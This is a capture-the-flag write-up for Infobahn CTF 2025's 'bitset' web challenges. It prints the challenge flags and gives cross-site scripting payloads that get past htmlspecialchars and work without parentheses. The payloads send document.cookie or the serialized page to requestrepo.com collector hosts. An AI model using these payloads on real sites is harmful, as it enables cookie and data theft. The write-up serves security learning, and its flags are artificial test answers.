# bitset

|              |                                                                                                                 |
| ------------ | --------------------------------------------------------------------------------------------------------------- |
| **CTF**      | [Infobahn CTF 2025](http://2025.infobahnc.tf/) [(CTFtime)](https://ctftime.org/event/2878/)                     |
| **Author**   | [rewhile](https://github.com/rewhile) [bawolff](https://github.com/bawolff) [Yuu](https://github.com/anzuukino) |
| **Category** | beginner                                                                                                        |
| **Solves**   | 167                                                                                                             |
| **Files**    | [bitset.zip](./bitset.zip)                                                                                      |

# Solution

# bitset(s(y)) unintended

Since bun automatically serves the current directory, you can simply do this. Thanks to @.\_.marwan for discovering this

```sh
❯ curl https://bitset-web.challs.infobahnc.tf/run.sh
#!/bin/bash

cd /app || exit
export FLAG1='infobahn{1eT5_seE_whO_rE4Ds_th3_Php_docs}'
export FLAG2='infobahn{d1d_YOU_fINd_oUt_THI5_P4y10@D_From_por75wiG6Er}'
export FLAG3='infobahn{C0NgR@tS_you_aR3_A_SEnior_1n73Rn_IN_BEGInNeR}'
bun /app/server.js
```

# bitset-revenge

```html
htmlspecialchars('![ ](' . $s . ')', ENT_HTML5, 'UTF-8')
```

ENT_HTML5 doesn't escape ' or ", you can still use those.
Since ) means the end of the markdown, you can use location to avoid parentheses

```sh
https://bitset-revenge-web.challs3.infobahnc.tf/bot?url=http://'%20onerror='location=`//e4zy20y7.requestrepo.com/?${document.cookie}`
```

# bitsets-revenge

You can solve this by reading [portswigger cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

The idea is that you could use `JSON.stringify(document)` to dump the flag and use `Function` to xss without parentheses since `\u0029` means ), note that I meant to write 3 backticks, I had to add a \ because of discord formatting

````sh
https://bitset-revenge-web.challs3.infobahnc.tf/bot?url=http://%27+onerror=%22location=`//lp2drty9.requestrepo.com/`%2bFunction`return%20JSON.stringify(document\u0029```%22

````

# bitsetsy-revenge

The idea is to use the `location.hash`, you can do the following steps:

1. Make the bot visit your website using location
2. In your website and redirect it back to `127.0.0.1:6969`
3. The bot parses the url within the length limit and execute the payload after the #

Put in the response of `lp2drty9.requestrepo.com`:

````html
<script>
  location = "http://127.0.0.1:6969/?url=http://'+onerror='Function`eval(location.hash.substr(1%5cx29%5cx29```#location='//e4zy20y7.requestrepo.com/?'+JSON.stringify(document).slice(-100)";
</script>
````

Then send this payload

```sh
https://bitset-revenge-web.challs3.infobahnc.tf/bot?url=http://'+onerror='location=`//lp2drty9.requestrepo.com`
```

Note: I should've checked the url length inside index.php
